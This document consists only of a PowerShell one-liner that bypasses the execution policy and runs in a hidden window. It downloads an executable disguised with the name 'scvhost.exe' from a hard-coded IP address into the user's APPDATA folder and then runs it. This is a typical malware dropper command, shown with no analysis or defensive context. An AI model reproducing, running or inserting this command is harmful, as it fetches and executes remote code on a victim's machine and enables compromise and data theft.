
PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://94.102.52.13/~harvy/scvhost.exe', $env:APPDATA\stvgs.exe );Start-Process ( $env:APPDATA\stvgs.exe )

